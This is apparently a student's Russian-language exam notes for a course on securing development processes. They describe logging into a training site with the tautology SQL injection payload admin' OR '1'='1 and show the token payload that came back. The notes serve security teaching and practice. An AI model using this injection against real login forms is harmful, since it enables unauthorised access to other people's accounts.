# К экзамену

## Обеспечение защиты процессов разработки

### Задание

Необходимо зайти под админской УЗ по указанному в задании адресу, используя уязвимости.

### Решение

[Tautology-Based SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection).

В поля вставила:

```sql
admin' OR '1'='1
```

Предположительно, в SQL сработало так:

```sql
...
WHERE username = 'admin' OR '1'='1'
AND password = 'admin' OR '1'='1';
```

В этом случае получается, что значение всегда истинно.

Результат:
![скриншот](images/itmo_profile.png)

Полученный ключ:

```json
{
  "iat": 1781964761,
  "name": "ITMO Student",
  "role": "user",
  "sub": "1",
  "username": "student"
}
```

## Облачные и кластерные технологии